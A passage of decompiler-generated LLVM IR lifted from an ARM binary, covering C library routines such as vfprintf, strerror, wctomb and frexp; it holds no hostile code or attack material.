  uselistorder i32* %ip.global-to-local, { 36, 51, 52, 53, 54, 55, 0, 2, 9, 3, 4, 1, 5, 6, 7, 8, 49, 10, 11, 12, 13, 14, 15, 50, 16, 17, 18, 63, 19, 20, 45, 21, 46, 47, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 48, 37, 38, 44, 39, 40, 41, 42, 43, 56, 57, 58, 59, 60, 61, 62, 64, 65 }
  uselistorder i32 18, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* inttoptr (i32 1 to i8*), { 1, 0 }
  uselistorder i32 -9, { 5, 6, 7, 8, 9, 2, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 3, 1, 19, 4, 20, 21 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_uldivmod, { 4, 3, 2, 1, 0 }
  uselistorder i32 1000000000, { 0, 6, 2, 4, 1, 3, 5 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i8 43, { 1, 0, 2 }
  uselistorder i8 2, { 2, 0, 1, 3 }
  uselistorder i32 43, { 0, 2, 3, 1, 4 }
  uselistorder i32 45, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dsub, { 3, 2, 1, 0 }
  uselistorder i8 45, { 0, 3, 4, 1, 2 }
  uselistorder i32 1075838976, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @pad, { 4, 3, 2, 1, 0, 14, 13, 12, 11, 10, 5, 9, 8, 7, 6 }
  uselistorder i32 (i32*)* @out, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16 }
  uselistorder i32 (i32, i32)* @wctomb, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fmt_u, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), { 5, 6, 4, 7, 2, 8, 9, 3, 10, 0, 1, 11, 12 }
  uselistorder i32 120, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 99, { 1, 0 }
  uselistorder i32 97, { 3, 0, 1, 4, 5, 2 }
  uselistorder i32 65, { 1, 3, 0, 2 }
  uselistorder i32 -65537, { 1, 0, 2, 3, 4 }
  uselistorder i8 16, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32)* @pop_arg, { 1, 0 }
  uselistorder i32 57, { 0, 2, 1 }
  uselistorder i32 -65, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_19f14.685 to i32), { 1, 0, 2 }
  uselistorder i8* inttoptr (i32 -1 to i8*), { 1, 0 }
  uselistorder i8 46, { 4, 1, 0, 3, 5, 6, 2 }
  uselistorder i32 8192, { 2, 1, 0, 3, 4 }
  uselistorder i8 42, { 1, 0, 2 }
  uselistorder i8 37, { 1, 2, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 11, { 0, 3, 1, 4, 5, 2 }
  uselistorder label %dec_label_pc_15d30, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_15d00, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15cf4, { 1, 0 }
  uselistorder label %dec_label_pc_15ce8, { 7, 6, 0, 3, 5, 2, 4, 1 }
  uselistorder label %bb644, { 1, 0 }
  uselistorder label %bb642, { 1, 0 }
  uselistorder label %dec_label_pc_15ba8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15ba4, { 1, 0 }
  uselistorder label %dec_label_pc_15b68, { 1, 0 }
  uselistorder label %dec_label_pc_15b18, { 1, 0 }
  uselistorder label %bb636, { 1, 0 }
  uselistorder label %dec_label_pc_15aec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15aa0, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb633, { 1, 0 }
  uselistorder label %dec_label_pc_159ec, { 1, 0 }
  uselistorder label %dec_label_pc_159dc, { 1, 0 }
  uselistorder label %bb627, { 1, 0 }
  uselistorder label %dec_label_pc_159a4, { 1, 0 }
  uselistorder label %dec_label_pc_15978, { 1, 0 }
  uselistorder label %dec_label_pc_15930, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15920, { 1, 0 }
  uselistorder label %bb624, { 1, 0 }
  uselistorder label %dec_label_pc_1587c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1583c, { 1, 0 }
  uselistorder label %bb620, { 1, 0 }
  uselistorder label %bb616, { 1, 0 }
  uselistorder label %dec_label_pc_1572c, { 1, 0 }
  uselistorder label %dec_label_pc_156f4, { 1, 0 }
  uselistorder label %bb613, { 1, 0 }
  uselistorder label %bb611, { 1, 0 }
  uselistorder label %dec_label_pc_15694, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15688, { 1, 0 }
  uselistorder label %dec_label_pc_15678.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15658, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15640, { 1, 0 }
  uselistorder label %.thread106, { 1, 0 }
  uselistorder label %dec_label_pc_155e8, { 1, 0 }
  uselistorder label %.thread105, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1557c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15528, { 1, 0 }
  uselistorder label %dec_label_pc_154f0, { 1, 0 }
  uselistorder label %bb605, { 1, 0 }
  uselistorder label %bb601, { 1, 0 }
  uselistorder label %dec_label_pc_153f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153e0, { 1, 0 }
  uselistorder label %dec_label_pc_1539c, { 1, 0 }
  uselistorder label %dec_label_pc_15390, { 1, 0 }
  uselistorder label %bb596, { 1, 0 }
  uselistorder label %.thread92, { 1, 0 }
  uselistorder label %.thread91, { 1, 0 }
  uselistorder label %dec_label_pc_15338, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15318.dec_label_pc_15318_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_152cc, { 1, 0 }
  uselistorder label %dec_label_pc_152a0, { 1, 0 }
  uselistorder label %dec_label_pc_15258, { 1, 0 }
  uselistorder label %dec_label_pc_151fc, { 1, 0 }
  uselistorder label %bb588, { 1, 0 }
  uselistorder label %bb586, { 1, 0 }
  uselistorder label %dec_label_pc_15114, { 1, 0 }
  uselistorder label %dec_label_pc_15108, { 1, 0 }
  uselistorder label %dec_label_pc_15064, { 1, 0 }
  uselistorder label %dec_label_pc_15054, { 1, 0 }
  uselistorder label %dec_label_pc_15000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14ffc, { 1, 0 }
  uselistorder label %bb583, { 1, 0 }
  uselistorder label %bb580, { 1, 0 }
  uselistorder label %.thread89, { 1, 0 }
  uselistorder label %bb574, { 1, 0 }
  uselistorder label %dec_label_pc_14ef8, { 3, 2, 0, 1 }
  uselistorder label %bb572, { 1, 0 }
  uselistorder label %.thread80, { 1, 0 }
  uselistorder label %bb569, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d38, { 2, 0, 1 }
  uselistorder label %.thread76, { 1, 0 }
  uselistorder label %dec_label_pc_14cb4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14c40, { 1, 0 }
  uselistorder label %dec_label_pc_14c18, { 1, 0 }
  uselistorder label %bb564, { 1, 0 }
  uselistorder label %bb562, { 2, 0, 1 }
  uselistorder label %bb560, { 1, 0 }
  uselistorder label %bb554, { 1, 0 }
  uselistorder label %dec_label_pc_14ae0, { 3, 0, 2, 1 }
  uselistorder label %bb552, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14a34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_149fc, { 1, 0 }
  uselistorder label %dec_label_pc_14988, { 1, 0 }
  uselistorder label %dec_label_pc_14958, { 2, 0, 1 }
  uselistorder label %bb549, { 1, 0 }
  uselistorder label %dec_label_pc_14928, { 1, 0 }
  uselistorder label %bb547, { 1, 0 }
  uselistorder label %.thread46, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1475c, { 1, 0 }
  uselistorder label %dec_label_pc_146b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146a0, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %bb542, { 1, 0 }
  uselistorder label %dec_label_pc_145c0, { 1, 0 }
  uselistorder label %dec_label_pc_145b4, { 1, 0 }
  uselistorder label %dec_label_pc_14508, { 1, 0 }
  uselistorder label %dec_label_pc_144e4, { 1, 0 }
  uselistorder label %.thread34, { 1, 0 }
  uselistorder label %dec_label_pc_14470, { 1, 0 }
  uselistorder label %.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_14420, { 2, 0, 1 }
  uselistorder label %dec_label_pc_143e4, { 12, 0, 1, 2, 3, 10, 7, 8, 9, 11, 5, 6, 4, 13 }
}

define i32 @vfprintf(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v3_15d40 = load i32, i32* @r4, align 4
  %v18_15d40 = load i32, i32* @sl, align 4
  %v2_15d48 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_15d48, i32* @r5, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 40, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_15d48, i32* @r0, align 4
  %v0_15d64 = call i32 @memset()
  %v0_15d6c = load i32, i32* @r4, align 4
  store i32 %v0_15d6c, i32* %stack_var_-36, align 4
  %v6_15d6c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v6_15d6c, i32* @r2, align 4
  store i32 0, i32* @r0, align 4
  %v0_15d74 = load i32, i32* @r8, align 4
  store i32 %v0_15d74, i32* @r1, align 4
  %v2_15d78 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_15d78, i32* @r3, align 4
  %v0_15d80 = call i32 @printf_core()
  %v1_15d84 = icmp slt i32 %v0_15d80, 0
  br i1 %v1_15d84, label %.thread17, label %dec_label_pc_15d90

.thread17:                                        ; preds = %entry
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e78

dec_label_pc_15d90:                               ; preds = %entry
  %v0_15d90 = load i32, i32* @r6, align 4
  %v1_15d90 = add i32 %v0_15d90, 76
  %v2_15d90 = inttoptr i32 %v1_15d90 to i32*
  %v3_15d90 = load i32, i32* %v2_15d90, align 4
  store i32 %v3_15d90, i32* %r3.global-to-local, align 4
  %v1_15d94 = icmp slt i32 %v3_15d90, 0
  br i1 %v1_15d94, label %.thread18, label %dec_label_pc_15da0

.thread18:                                        ; preds = %dec_label_pc_15d90
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_15dac

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d90
  store i32 %v0_15d90, i32* @r0, align 4
  %v0_15da4 = call i32 @__lockfile()
  store i32 %v0_15da4, i32* @sl, align 4
  %v0_15dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15dac

dec_label_pc_15dac:                               ; preds = %.thread18, %dec_label_pc_15da0
  %v6_15dbc = phi i32 [ %v0_15dac.pre, %dec_label_pc_15da0 ], [ %v0_15d90, %.thread18 ]
  %v1_15dac = add i32 %v6_15dbc, 74
  %v2_15dac = inttoptr i32 %v1_15dac to i8*
  %v3_15dac = load i8, i8* %v2_15dac, align 1
  %v4_15dac = sext i8 %v3_15dac to i32
  store i32 %v4_15dac, i32* %r3.global-to-local, align 4
  %v1_15db0 = inttoptr i32 %v6_15dbc to i32*
  %v2_15db0 = load i32, i32* %v1_15db0, align 4
  store i32 %v2_15db0, i32* @r7, align 4
  %tmp35 = icmp slt i8 %v3_15dac, 1
  br i1 %tmp35, label %bb, label %bb36

bb:                                               ; preds = %dec_label_pc_15dac
  %v6_15db8 = and i32 %v2_15db0, -33
  store i32 %v6_15db8, i32* %r3.global-to-local, align 4
  store i32 %v6_15db8, i32* %v1_15db0, align 4
  %v0_15dc0.pre = load i32, i32* @r6, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_15dac, %bb
  %v0_15df410 = phi i32 [ %v0_15dc0.pre, %bb ], [ %v6_15dbc, %dec_label_pc_15dac ]
  %v1_15dc0 = add i32 %v0_15df410, 48
  %v2_15dc0 = inttoptr i32 %v1_15dc0 to i32*
  %v3_15dc0 = load i32, i32* %v2_15dc0, align 4
  store i32 %v3_15dc0, i32* %r3.global-to-local, align 4
  %v2_15dc4 = icmp eq i32 %v3_15dc0, 0
  br i1 %v2_15dc4, label %bb37, label %bb38

bb37:                                             ; preds = %bb36
  %v3_15dc8 = ptrtoint i32* %stack_var_-240 to i32
  store i32 %v3_15dc8, i32* %r3.global-to-local, align 4
  %v2_15dcc = add i32 %v3_15dc8, 80
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 80, i32* %v2_15dc0, align 4
  %v1_15dd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15dd8 = load i32, i32* @r6, align 4
  %v3_15dd8 = add i32 %v2_15dd8, 16
  %v4_15dd8 = inttoptr i32 %v3_15dd8 to i32*
  store i32 %v1_15dd8, i32* %v4_15dd8, align 4
  %v1_15ddc = load i32, i32* %r3.global-to-local, align 4
  %v2_15ddc = load i32, i32* @r6, align 4
  %v3_15ddc = add i32 %v2_15ddc, 28
  %v4_15ddc = inttoptr i32 %v3_15ddc to i32*
  store i32 %v1_15ddc, i32* %v4_15ddc, align 4
  %v1_15de0 = load i32, i32* %r3.global-to-local, align 4
  %v2_15de0 = load i32, i32* @r6, align 4
  %v3_15de0 = add i32 %v2_15de0, 20
  %v4_15de0 = inttoptr i32 %v3_15de0 to i32*
  store i32 %v1_15de0, i32* %v4_15de0, align 4
  %v1_15de4 = load i32, i32* @r6, align 4
  %v2_15de4 = add i32 %v1_15de4, 44
  %v3_15de4 = inttoptr i32 %v2_15de4 to i32*
  %v4_15de4 = load i32, i32* %v3_15de4, align 4
  store i32 %v4_15de4, i32* @r5, align 4
  %v1_15dec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_15dec, i32* %v3_15de4, align 4
  %v0_15df0 = load i32, i32* @r8, align 4
  store i32 %v0_15df0, i32* @r1, align 4
  %v0_15df4 = load i32, i32* @r6, align 4
  store i32 %v0_15df4, i32* @r0, align 4
  store i32 %v6_15d6c, i32* @r2, align 4
  store i32 %v2_15d78, i32* @r3, align 4
  br label %bb39

bb38:                                             ; preds = %bb36
  %v0_15df09 = load i32, i32* @r8, align 4
  store i32 %v0_15df09, i32* @r1, align 4
  store i32 %v0_15df410, i32* @r0, align 4
  store i32 %v6_15d6c, i32* @r2, align 4
  store i32 %v2_15d78, i32* @r3, align 4
  store i32 0, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %bb37, %bb38
  %v0_15e08 = call i32 @printf_core()
  %v0_15e0c = load i32, i32* @r5, align 4
  %v2_15e0c = icmp eq i32 %v0_15e0c, 0
  store i32 %v0_15e08, i32* %r4.global-to-local, align 4
  br i1 %v2_15e0c, label %bb41, label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %bb39
  store i32 0, i32* @r1, align 4
  %v0_15e20 = load i32, i32* @r6, align 4
  %v1_15e24 = add i32 %v0_15e20, 36
  %v2_15e24 = inttoptr i32 %v1_15e24 to i32*
  %v3_15e24 = load i32, i32* %v2_15e24, align 4
  call void @__pseudo_branch(i32 %v3_15e24)
  %v0_15e30 = load i32, i32* @r6, align 4
  %v1_15e30 = add i32 %v0_15e30, 20
  %v2_15e30 = inttoptr i32 %v1_15e30 to i32*
  %v3_15e30 = load i32, i32* %v2_15e30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_15e38 = icmp eq i32 %v3_15e30, 0
  %v0_15e3c = load i32, i32* @r5, align 4
  %v2_15e3c = add i32 %v0_15e30, 44
  %v3_15e3c = inttoptr i32 %v2_15e3c to i32*
  store i32 %v0_15e3c, i32* %v3_15e3c, align 4
  %v0_15e40 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e40 = load i32, i32* @r6, align 4
  %v2_15e40 = add i32 %v1_15e40, 20
  %v3_15e40 = inttoptr i32 %v2_15e40 to i32*
  store i32 %v0_15e40, i32* %v3_15e40, align 4
  %v0_15e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e44 = load i32, i32* @r6, align 4
  %v2_15e44 = add i32 %v1_15e44, 48
  %v3_15e44 = inttoptr i32 %v2_15e44 to i32*
  store i32 %v0_15e44, i32* %v3_15e44, align 4
  %v0_15e48 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e48 = load i32, i32* @r6, align 4
  %v2_15e48 = add i32 %v1_15e48, 16
  %v3_15e48 = inttoptr i32 %v2_15e48 to i32*
  store i32 %v0_15e48, i32* %v3_15e48, align 4
  %v0_15e4c = load i32, i32* %r3.global-to-local, align 4
  %v1_15e4c = load i32, i32* @r6, align 4
  %v2_15e4c = add i32 %v1_15e4c, 28
  %v3_15e4c = inttoptr i32 %v2_15e4c to i32*
  store i32 %v0_15e4c, i32* %v3_15e4c, align 4
  br i1 %v9_15e38, label %bb40, label %bb41

bb40:                                             ; preds = %dec_label_pc_15e18
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %bb39, %dec_label_pc_15e18, %bb40
  %v0_15e54 = load i32, i32* @r6, align 4
  %v1_15e54 = inttoptr i32 %v0_15e54 to i32*
  %v2_15e54 = load i32, i32* %v1_15e54, align 4
  %v0_15e58 = load i32, i32* @r7, align 4
  %v1_15e58 = and i32 %v0_15e58, 32
  store i32 %v1_15e58, i32* %r3.global-to-local, align 4
  %v1_15e5c = and i32 %v2_15e54, 32
  %v2_15e5c = icmp eq i32 %v1_15e5c, 0
  br i1 %v2_15e5c, label %bb43, label %bb42

bb42:                                             ; preds = %bb41
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42
  %v2_15e64 = or i32 %v1_15e58, %v2_15e54
  store i32 %v2_15e64, i32* %r3.global-to-local, align 4
  %v0_15e68 = load i32, i32* @sl, align 4
  %v2_15e68 = icmp eq i32 %v0_15e68, 0
  store i32 %v2_15e64, i32* %v1_15e54, align 4
  br i1 %v2_15e68, label %bb45, label %bb44

bb44:                                             ; preds = %bb43
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15e74 = xor i1 %v2_15e68, true
  call void @__pseudo_cond_branch(i1 %v1_15e74, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  %v0_15e78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %.thread17, %bb45
  %v0_15e78 = phi i32 [ -1, %.thread17 ], [ %v0_15e78.pre, %bb45 ]
  store i32 %v3_15d40, i32* @r4, align 4
  store i32 %v18_15d40, i32* @sl, align 4
  ret i32 %v0_15e78

; uselistorder directives
  uselistorder i32 %v6_15dbc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 -33, { 1, 2, 0 }
  uselistorder i32 74, { 3, 0, 4, 1, 2 }
  uselistorder i32 ()* @__lockfile, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 ()* @printf_core, { 1, 0 }
  uselistorder i32 ()* @memset, { 6, 7, 28, 19, 5, 22, 4, 29, 24, 18, 2, 17, 16, 15, 14, 13, 3, 12, 11, 10, 9, 8, 1, 0, 27, 26, 25, 23, 21, 20 }
  uselistorder label %dec_label_pc_15e78, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %bb41, { 2, 1, 0 }
  uselistorder label %bb39, { 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_15dac, { 1, 0 }
}

define i32 @pipe() local_unnamed_addr {
entry:
  %v0_15e94 = call i32 @__syscall_ret()
  ret i32 %v0_15e94

; uselistorder directives
  uselistorder i32 ()* @__syscall_ret, { 10, 35, 9, 8, 7, 34, 21, 11, 29, 6, 24, 33, 32, 31, 20, 5, 0, 28, 27, 19, 4, 23, 18, 17, 3, 2, 1, 26, 15, 16, 25, 13, 30, 14, 12, 22 }
}

define i32 @__strerror_l(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15ec4.lr.ph:
  br label %dec_label_pc_15ec4

dec_label_pc_15eb4:                               ; preds = %dec_label_pc_15ec4
  %v1_15eb4 = add i32 %v0_15eb4, 1
  %v2_15eb8 = add i32 %v0_15eb4, add (i32 ptrtoint (i32* @global_var_1a0f4.724 to i32), i32 1)
  %v3_15eb8 = inttoptr i32 %v2_15eb8 to i8*
  %v4_15eb8 = load i8, i8* %v3_15eb8, align 1
  %v6_15eb8 = zext i8 %v4_15eb8 to i32
  %v2_15ebc = icmp eq i8 %v4_15eb8, 0
  br i1 %v2_15ebc, label %dec_label_pc_15ee4, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15ec4.lr.ph, %dec_label_pc_15eb4
  %v0_15eb4 = phi i32 [ 0, %dec_label_pc_15ec4.lr.ph ], [ %v1_15eb4, %dec_label_pc_15eb4 ]
  %v0_15ec4 = phi i32 [ 84, %dec_label_pc_15ec4.lr.ph ], [ %v6_15eb8, %dec_label_pc_15eb4 ]
  %v9_15ec4 = icmp eq i32 %v0_15ec4, %arg1
  br i1 %v9_15ec4, label %dec_label_pc_15ee4, label %dec_label_pc_15eb4

dec_label_pc_15ed0:                               ; preds = %dec_label_pc_15ed0.preheader, %dec_label_pc_15ed0
  %v0_15ed0 = phi i32 [ %v0_15ed012, %dec_label_pc_15ed0.preheader ], [ %v5_15ed0, %dec_label_pc_15ed0 ]
  %v1_15ed0 = inttoptr i32 %v0_15ed0 to i8*
  %v2_15ed0 = load i8, i8* %v1_15ed0, align 1
  %v5_15ed0 = add i32 %v0_15ed0, 1
  store i32 %v5_15ed0, i32* @r0, align 4
  %v2_15ed4 = icmp eq i8 %v2_15ed0, 0
  br i1 %v2_15ed4, label %dec_label_pc_15edc, label %dec_label_pc_15ed0

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15ed0
  %v1_15edc = add i32 %v0_15edc, -1
  %v2_15ee8 = icmp eq i32 %v1_15edc, 0
  br i1 %v2_15ee8, label %dec_label_pc_15ef0, label %dec_label_pc_15ed0.preheader

dec_label_pc_15ee4:                               ; preds = %dec_label_pc_15eb4, %dec_label_pc_15ec4
  %v0_15ee8.pr = phi i32 [ %v0_15eb4, %dec_label_pc_15ec4 ], [ %v1_15eb4, %dec_label_pc_15eb4 ]
  store i32 ptrtoint ([22 x i8]* @global_var_1a14c.726 to i32), i32* @r0, align 4
  %v2_15ee82 = icmp eq i32 %v0_15ee8.pr, 0
  br i1 %v2_15ee82, label %dec_label_pc_15ef0, label %dec_label_pc_15ed0.preheader

dec_label_pc_15ed0.preheader:                     ; preds = %dec_label_pc_15ee4, %dec_label_pc_15edc
  %v0_15edc = phi i32 [ %v1_15edc, %dec_label_pc_15edc ], [ %v0_15ee8.pr, %dec_label_pc_15ee4 ]
  %v0_15ed012 = phi i32 [ %v5_15ed0, %dec_label_pc_15edc ], [ ptrtoint ([22 x i8]* @global_var_1a14c.726 to i32), %dec_label_pc_15ee4 ]
  br label %dec_label_pc_15ed0

dec_label_pc_15ef0:                               ; preds = %dec_label_pc_15edc, %dec_label_pc_15ee4
  %v1_15ef0 = add i32 %arg2, 20
  %v2_15ef0 = inttoptr i32 %v1_15ef0 to i32*
  %v3_15ef0 = load i32, i32* %v2_15ef0, align 4
  store i32 %v3_15ef0, i32* @r1, align 4
  %v0_15ef4 = call i32 @__lctrans()
  ret i32 %v0_15ef4

; uselistorder directives
  uselistorder i32 %v5_15ed0, { 0, 2, 1 }
  uselistorder i32 %v0_15ed0, { 1, 0 }
  uselistorder i32 %v0_15eb4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15ef0, { 1, 0 }
  uselistorder label %dec_label_pc_15ee4, { 1, 0 }
  uselistorder label %dec_label_pc_15ec4, { 1, 0 }
}

define i32 @strerror(i32 %arg1) local_unnamed_addr {
entry:
  %v0_15f0c = load i32, i32* @lr, align 4
  %v0_15f14 = call i32 @__aeabi_read_tp()
  %v1_15f18 = add i32 %v0_15f14, -48
  %v2_15f18 = inttoptr i32 %v1_15f18 to i32*
  %v3_15f18 = load i32, i32* %v2_15f18, align 4
  store i32 %v0_15f0c, i32* @lr, align 4
  %v2_15f24 = call i32 @__strerror_l(i32 %arg1, i32 %v3_15f18)
  ret i32 %v2_15f24
}

define i32 @_dummy.15(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15f28 = load i32, i32* @r0, align 4
  ret i32 %v1_15f28
}

define i32 @__lctrans() local_unnamed_addr {
entry:
  %v1_15f3c = load i32, i32* @r0, align 4
  %v2_15f3c = load i32, i32* @r1, align 4
  %v3_15f3c = call i32 @_dummy.15(i32 %v1_15f3c, i32 %v2_15f3c)
  ret i32 %v3_15f3c
}

define i32 @__lctrans_cur(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_15f5c = call i32 @__aeabi_read_tp()
  %v1_15f60 = add i32 %v0_15f5c, -48
  %v2_15f60 = inttoptr i32 %v1_15f60 to i32*
  %v3_15f60 = load i32, i32* %v2_15f60, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_15f68 = add i32 %v3_15f60, 20
  %v2_15f68 = inttoptr i32 %v1_15f68 to i32*
  %v3_15f68 = load i32, i32* %v2_15f68, align 4
  %v3_15f74 = call i32 @_dummy.15(i32 %arg1, i32 %v3_15f68)
  ret i32 %v3_15f74

; uselistorder directives
  uselistorder i32 (i32, i32)* @_dummy.15, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @frexpl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_15f90 = call i32 @frexp()
  ret i32 %v0_15f90
}

define i32 @wctomb(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_15fa4 = icmp eq i32 %arg1, 0
  br i1 %v2_15fa4, label %bb, label %.thread

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb3

.thread:                                          ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %bb, %.thread
  %v1_15fb4 = xor i1 %v2_15fa4, true
  call void @__pseudo_cond_branch(i1 %v1_15fb4, i32 ptrtoint (i32* @global_var_1609c.729 to i32))
  %v1_15fc0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15fc0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @frexp() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %v3_15fc4 = load i32, i32* @r4, align 4
  %v6_15fc4 = load i32, i32* @r5, align 4
  %v12_15fc4 = load i32, i32* @r7, align 4
  %v18_15fc4 = load i32, i32* @sb, align 4
  %v0_15fc8 = load i32, i32* @r1, align 4
  %v3_15fc8 = udiv i32 %v0_15fc8, 1048576
  %v3_15fd0 = urem i32 %v3_15fc8, 2048
  store i32 %v3_15fd0, i32* @r4, align 4
  %v2_15fd4 = icmp eq i32 %v3_15fd0, 0
  %v0_15fdc = load i32, i32* @r0, align 4
  store i32 %v0_15fdc, i32* @r5, align 4
  store i32 %v0_15fc8, i32* @r6, align 4
  store i32 %v0_15fdc, i32* @r8, align 4
  store i32 %v0_15fc8, i32* @sb, align 4
  %v0_15fec = load i32, i32* @r2, align 4
  store i32 %v0_15fec, i32* @r7, align 4
  br i1 %v2_15fd4, label %dec_label_pc_15ff4, label %dec_label_pc_16040

dec_label_pc_15ff4:                               ; preds = %entry
  store i32 0, i32* @r2, align 4
  %v0_15ffc = call i32 @__aeabi_dcmpeq()
  %v2_16000 = icmp eq i32 %v0_15ffc, 0
  br i1 %v2_16000, label %dec_label_pc_1600c, label %bb

bb:                                               ; preds = %dec_label_pc_15ff4
  %v1_16004 = load i32, i32* @r4, align 4
  %v2_16004 = load i32, i32* @r7, align 4
  %v3_16004 = inttoptr i32 %v2_16004 to i32*
  store i32 %v1_16004, i32* %v3_16004, align 4
  br label %dec_label_pc_16078

dec_label_pc_1600c:                               ; preds = %dec_label_pc_15ff4
  %v0_16010 = load i32, i32* @r5, align 4
  %v1_16010 = sext i32 %v0_16010 to i64
  %v0_16014 = load i32, i32* @r6, align 4
  store i32 %v0_16014, i32* @r1, align 4
  %v3_1601c = bitcast i64 %v1_16010 to double
  %v9_1601c = fmul double %v3_1601c, 0.000000e+00
  %v10_1601c = fptrunc double %v9_1601c to float
  %v11_1601c = bitcast float %v10_1601c to i32
  store i32 %v11_1601c, i32* @r0, align 4
  %v0_16020 = load i32, i32* @r7, align 4
